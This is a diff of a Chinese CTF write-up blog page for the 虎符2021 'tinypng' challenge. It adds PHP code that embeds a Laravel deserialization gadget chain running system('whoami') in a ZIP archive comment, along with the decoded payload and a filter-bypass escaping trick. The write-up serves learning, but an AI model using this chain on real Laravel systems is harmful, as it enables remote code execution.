@@ -84,7 +84,7 @@
             <h1>虎符2021线下  tinypng </h1>
             <span class="meta">
             	Posted on
-              2021-04-27，3 min read
+              2021-04-27，4 min read
             </span>
           </div>
         </div>
@@ -201,6 +201,20 @@ namespace{
 </code></pre>
 <p>生成phar后 gzip phar.phar 。产生一个phar.phar.gz<br>
 上传拿到文件名。然后image路由传<code>phar://../storage/app/uploads/xxxxxxxxxxx.png</code>完事了</p>
+<p>这是最简单的办法。还有通过ZIP注释反序列的。我简单放下EXP。这种方法。。得找一个类中不带关键字的</p>
+<pre><code>&lt;?php
+$a=base64_decode('Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7Uzo5OiJcMDAqXDAwZXZlbnRzIjtPOjMxOiJJbGx1bWluYXRlXFZhbGlkYXRpb25cVmFsaWRhdG9yIjoxOntzOjEwOiJleHRlbnNpb25zIjthOjE6e3M6MDoiIjtzOjY6InN5c3RlbSI7fX1TOjg6IlwwMCpcMDBldmVudCI7czo2OiJ3aG9hbWkiO30=');
+$zip = new ZipArchive;
+$res = $zip-&gt;open('test.zip', ZipArchive::CREATE);
+$zip-&gt;addFromString('test.txt', 'file content goes here');
+$zip-&gt;setArchiveComment($a);
+$zip-&gt;close();
+</code></pre>
+<p>替换效果如下。\00是我生成序列化类的时候替换的。。正常应该是00不可见字符串</p>
+<pre><code>O:40:&quot;Illuminate\Broadcasting\PendingBroadcast&quot;:2:{s:9:&quot;\00*\00events&quot;;O:31:&quot;Illuminate\Validation\Validator&quot;:1:{s:10:&quot;extensions&quot;;a:1:{s:0:&quot;&quot;;s:6:&quot;system&quot;;}}s:8:&quot;\00*\00event&quot;;s:6:&quot;whoami&quot;;}
+
+O:40:&quot;Illuminate\Broadcasting\PendingBroadcast&quot;:2:{S:9:&quot;\00*\00events&quot;;O:31:&quot;Illuminate\Validation\Validator&quot;:1:{s:10:&quot;extensions&quot;;a:1:{s:0:&quot;&quot;;s:6:&quot;system&quot;;}}S:8:&quot;\00*\00event&quot;;s:6:&quot;whoami&quot;;}
+</code></pre>
 
           
           <p class="next-post">下一篇：
